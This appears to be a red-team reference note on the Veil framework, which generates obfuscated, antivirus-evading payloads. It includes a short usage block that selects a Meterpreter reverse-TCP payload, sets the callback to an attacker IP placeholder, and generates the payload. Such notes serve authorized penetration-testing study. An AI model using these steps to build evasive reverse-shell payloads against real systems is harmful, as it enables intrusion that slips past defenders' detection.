---
title: Veil
aliases: ["Veil Framework", "Veil-Evasion", "Veil-Pillage"]
type: tool
domain: [red-team]
tags: [type/tool, domain/red-team]
source: "Chris Truncer / Veil-Framework"
source_url: "https://github.com/Veil-Framework/Veil"
verified: true
related: ["[[PowerShell Offensive Tradecraft]]", "[[User Hunting]]"]
created: 2026-06-07
updated: 2026-06-07
---

# Veil

> [!summary] One-liner
> A payload generation framework focused on AV evasion — generates obfuscated payloads in multiple languages (Python, C, C#, PowerShell, Ruby) to bypass signature-based detection.

## Components
- **Veil-Evasion**: Generate AV-evading payloads (Meterpreter, custom shellcode runners).
- **Veil-Pillage** (legacy): Post-exploitation modules.

## Usage
```bash
# Launch Veil
./Veil.py

# List payload options
use 1        # Evasion
list         # show all payload types
use <number> # select payload (e.g., python/meterpreter/rev_tcp)
set LHOST <ATTACKER_IP>
set LPORT <PORT>
generate
```

## Historical note
Veil was one of the earliest organized payload-evasion frameworks (circa 2013). The Veil-Framework project also included **PowerTools** modules — including early versions of [[PowerView]] (originally called Veil-PowerView) and utilities for [[User Hunting]] (`Invoke-FindLocalAdminAccess`). These later became standalone projects in the PowerSploit / harmj0y ecosystem.

## Related
- Evolved from: early Veil-Framework included [[PowerView]].
- Payload delivery: pairs with [[Empire]], Cobalt Strike, Metasploit.
